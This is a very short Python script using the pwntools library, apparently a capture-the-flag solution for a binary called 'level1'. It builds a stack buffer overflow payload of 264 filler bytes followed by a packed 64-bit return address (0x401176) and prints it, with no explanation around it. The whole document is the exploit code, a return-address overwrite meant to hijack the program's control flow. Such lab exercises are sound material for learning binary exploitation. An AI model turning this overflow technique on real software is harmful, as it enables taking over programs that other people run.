import pwn

# io = pwn.elf.elf.ELF('level1')
buffer = b'A'*(264)
buffer += pwn.p64(0x401176)
print(buffer)
